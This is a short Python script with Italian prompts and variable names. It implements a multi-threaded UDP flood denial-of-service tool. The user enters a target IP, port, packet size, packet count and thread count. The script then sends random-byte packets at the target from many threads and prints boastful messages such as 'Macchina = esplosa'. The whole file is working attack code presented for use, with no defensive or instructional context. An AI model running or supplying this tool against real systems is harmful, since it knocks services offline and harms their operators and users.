import socket
import random
import sys
import threading

def genera_pkt_rnd(dim):
    return bytes(random.getrandbits(8) for _ in range(dim))

def udp_flood(ip_bersaglio, porta_bersaglio, pkt, n_pkt):
    try:
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(n_pkt):
            udp_socket.sendto(pkt, (ip_bersaglio, porta_bersaglio))
    except Exception as e:
        print(f"Errore durante l'attacco UDP: {e}")
    finally:
        udp_socket.close()

if __name__ == "__main__":
    try:
        ip_bersaglio = input("Inserisci l'indirizzo IP del bersaglio: ").strip()
        porta_bersaglio = int(input("Inserisci la porta UDP del bersaglio: ").strip())
        dim_pkt = int(input("Inserisci la dimensione del pacchetto (in byte, ad esempio 1024): ").strip())
        n_pkt = int(input("Inserisci il numero di pacchetti da inviare per thread: ").strip())
        n_thread = int(input("Inserisci il numero di thread da utilizzare: ").strip())

        if n_pkt <= 0 or dim_pkt <= 0 or n_thread <= 0:
            print("La dimensione del pacchetto, il numero di pacchetti e il numero di thread devono essere maggiori di 0.")
            sys.exit(1)

        if porta_bersaglio <= 0 or porta_bersaglio > 65535:
            print("Numero di porta non valido. Deve essere compreso tra 1 e 65535.")
            sys.exit(1)

        print("Super attacco in corso")

        pkt = genera_pkt_rnd(dim_pkt)

        thread_list = []
        for _ in range(n_thread):
            thread = threading.Thread(target=udp_flood, args=(ip_bersaglio, porta_bersaglio, pkt, n_pkt))
            thread.start()
            thread_list.append(thread)
        
        for thread in thread_list:
            thread.join()

        print("Macchina = esplosa")
    except ValueError:
        print("Input non valido. Inserisci valori numerici per porta, dimensione pacchetto e numero di thread.")
    except KeyboardInterrupt:
        print("\nOperazione annullata dall'utente.")
